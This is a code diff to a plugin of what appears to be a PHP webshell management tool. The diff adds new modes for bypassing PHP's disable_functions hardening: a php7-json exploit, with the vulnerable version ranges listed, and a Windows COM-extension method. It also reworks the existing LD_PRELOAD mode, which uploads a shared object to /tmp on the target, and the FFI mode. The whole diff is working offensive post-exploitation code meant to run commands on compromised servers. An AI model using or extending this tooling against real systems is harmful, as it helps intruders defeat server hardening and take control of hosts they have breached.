@@ -4,9 +4,9 @@ from uuid import uuid4
 from libs.myapp import is_windows, send
 from webshell_plugins.upload import run as upload
 
-mode_to_desc_dict = {0: color.red("closed"), 1: color.green(
-    "php7-backtrace"), 2: color.green("LD_PRELOAD"), 3: color.green("FFI")}
-mode_linux_dict = (2, 3)
+mode_to_desc_dict = {0: color.red("closed"), 2: color.green(
+    "php7-backtrace"), 3: color.green("LD_PRELOAD"), 4: color.green("FFI"), 5: color.green("COM")}
+mode_linux_dict = (3, 4)
 
 
 def get_detectd_ld_preload():
@@ -20,8 +20,8 @@ foreach ($a as $v){
 }"""
 
 
-def get_detectd_FFI():
-    return """if (extension_loaded("FFI")){echo "exist";}"""
+def get_detectd_ext(extname: str):
+    return """if (extension_loaded("%s")){echo "exist";}""" % extname
 
 
 @alias(True, m="mode")
@@ -47,19 +47,34 @@ def run(mode: int = 0):
         - 7.3 < 7.3.15 (released 20 Feb 2020)
         - 7.4 < 7.4.3 (released 20 Feb 2020)
 
-    Mode 2 LD_PRELOAD(Only for *unix):
+    Mode 2 php7-json(Only for php7.1-7.3):
+
+        Origin:
+        - https://github.com/mm0r1/exploits/tree/master/php-json-bypass
+
+        Targets:
+        - 7.1 - all versions to date
+        - 7.2 < 7.2.19 (released 30 May 2019)
+        - 7.3 < 7.3.6 (released 30 May 2019)
+
+    Mode 3 LD_PRELOAD(Only for *unix):
 
         Need:
         - putenv, mail/error_log/mb_send_mail/imap_email fucntions enabled
 
-    Mode 3 FFI(Only for *unix and php >= 7.4):
+    Mode 4 FFI(Only for *unix and php >= 7.4):
 
         Need:
         - FFI extension
 
+    Mode 5 COM(Only for windows):
+
+        Need:
+        - com_dotnet extension
+
     """
     if (mode in mode_to_desc_dict and (mode not in mode_linux_dict or not is_windows())):
-        if (mode == 2 and not gget("webshell.ld_preload_path", "webshell", False)):
+        if (mode == 3 and not gget("webshell.ld_preload_path", "webshell", False)):
             disable_func_list = gget("webshell.disable_functions", "webshell")
             filename = "/tmp/%s.so" % str(uuid4())
             upload_result = upload(
@@ -75,13 +90,21 @@ def run(mode: int = 0):
                 return
             gset("webshell.ld_preload_path", filename, True, "webshell")
             gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
-        if (mode == 3):
-            res = send(get_detectd_FFI())
+        if (mode == 4):
+            res = send(get_detectd_ext("FFI"))
             if (not res):
                 return
             text = res.r_text.strip()
             if ("exist" not in text):
                 print(color.red("\nNo FFI extension!\n"))
+                return
+        if (mode == 5):
+            res = send(get_detectd_ext("com_dotnet"))
+            if (not res):
+                return
+            text = res.r_text.strip()
+            if ("exist" not in text):
+                print(color.red("\nNo com_dotnet extension!\n"))
                 return
         print(
             f"\nbypass disable_functions: {mode_to_desc_dict[mode]}\n")
